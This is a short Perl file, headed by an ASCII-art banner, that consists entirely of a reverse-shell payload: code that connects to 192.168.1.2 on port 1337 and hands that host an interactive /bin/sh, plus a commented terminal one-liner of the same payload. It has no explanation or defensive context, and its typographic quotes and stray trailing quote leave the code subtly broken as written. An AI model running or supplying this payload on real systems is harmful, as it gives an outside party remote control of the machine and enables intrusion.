# __                        __ _            ___                _____  
# / _|_ __ ___  _ __ ___    / _| | _____  __/ / |_ _   _ _ __  / _ \ \ 
#| |_| '__/ _ \| '_ ` _ \  | |_| |/ _ \ \/ / || __| | | | '_ \| | | | |
#|  _| | | (_) | | | | | | |  _| |  __/>  <| || |_| |_| | | | | |_| | |
#|_| |_|  \___/|_| |_| |_| |_| |_|\___/_/\_\ | \__|\__,_|_| |_|\___/| |
#                                           \_\                    /_/ 




use Socket;$i=”192.168.1.2″;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
#or terminale[
    
    #   perl -e ‘use Socket;$i=”192.168.1.2″;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# ]